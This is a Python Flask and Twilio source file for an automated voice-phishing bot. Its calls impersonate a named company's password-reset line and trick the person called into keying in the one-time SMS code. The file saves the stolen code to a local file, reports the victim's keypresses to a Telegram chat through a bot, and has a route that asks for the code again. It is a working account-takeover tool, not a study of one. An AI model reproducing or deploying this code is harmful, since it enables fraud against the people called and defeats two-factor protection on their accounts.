from flask import Flask, request
from twilio.twiml.voice_response import VoiceResponse, Gather, Play
import requests
import os
import json
app = Flask(__name__)



with open("config.json", "r") as jsonfile:
    data = json.load(jsonfile)
    token = data['tokenbot']


@app.route("/voice", methods=['GET', 'POST'])
def voice():
    # Start a TwiML response
    resp = VoiceResponse()
    resp.say(f"Hello, your {open(f'{os.getcwd()}/Extra/CompanyName.txt', 'r').read()} account password is trying to be reset,")
    gather = Gather(num_digits=1, action='/gather', timeout=120)
    gather.say('if you are the one trying to reset your password press 1, otherwise press 2')
    resp.append(gather)

    return str(resp)

@app.route('/gather', methods=['GET', 'POST'])
def gather():
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()

    # If Twilio's request to our app included already gathered digits
    # process them
    if 'Digits' in request.values:

        # Get which digit the caller chose
        choice = request.values['Digits']
        
        # <Say> a different message depending on the caller's choice
        if choice == '2':
            requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id='+ open(f'{os.getcwd()}/Extra/chatid.txt', 'r').read()+'&text=<b>User Pressed 2</b>&parse_mode=HTML')
            gatherotp = Gather(num_digits=int(open(f"{os.getcwd()}/Extra/Digits.txt", 'r').read()), action='/gatherotp', timeout=120)
            gatherotp.say(f'Please insert the {open(f"{os.getcwd()}/Extra/Digits.txt", "r").read()} digits code that we sent you using sms')
            resp.append(gatherotp)

            return str(resp)
        elif choice == '1':
            requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id='+ open(f'{os.getcwd()}/Extra/chatid.txt', 'r').read()+'&text=<b>User Pressed 1</b>&parse_mode=HTML')
            
            gatherotp = Gather(num_digits=int(open(f"{os.getcwd()}/Extra/Digits.txt", 'r').read()), action='/gatherotp', timeout=120)
            gatherotp.say(f'To continue the reset, please give us the {open("Extra/Digits.txt", "r").read()} digits code that we sent')
            resp.append(gatherotp)
            return str(resp)
        else:
            # If the caller didn't choose 1 or 2, apologize and ask them again
            resp.say("Sorry, I don't understand that choice.")
            resp.redirect('/voice')
            return str(resp)

    # If the user didn't choose 1 or 2 (or anything), send them back to /voice
    resp.redirect('/voice')

    return str(resp)

@app.route('/gatherotp', methods=['GET', 'POST'])
def gatherotp():
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()

    # If Twilio's request to our app included already gathered digits,
    # process them
    if 'Digits' in request.values:
        if request.values['Digits'] == "2":
            resp.say('Thank you for verifying yourself, your account is now safe and your access has been regained. This call will be disconnected now, have a nice day')
        else:
            resp.say('Thank you for the call')
            
        # Get which digit the caller chose
        a = open(f'{os.getcwd()}/Extra/otp.txt', 'w', encoding='utf-8')
        choice1 = request.values['Digits']
        a.write(choice1)
        return str(resp)

    else:
        # If the caller didn't choose 1 or 2, apologize and ask them again
        resp.say("Sorry, I don't understand that choice.")
        resp.redirect('/gather')
        return str(resp)

@app.route("/voiceagain", methods=['GET', 'POST'])
def voiceagain():
    # Start a TwiML response
    resp = VoiceResponse()
    resp.say(f"Hello, it seems like you accidently type wrong one time passcode,")
    gather = Gather(num_digits=1, action='/gather', timeout=120)
    gather.say('To enter the one time passcode again,Press 1,')
    resp.append(gather)

    return str(resp)


if __name__ == "__main__":
    app.run(debug=True)
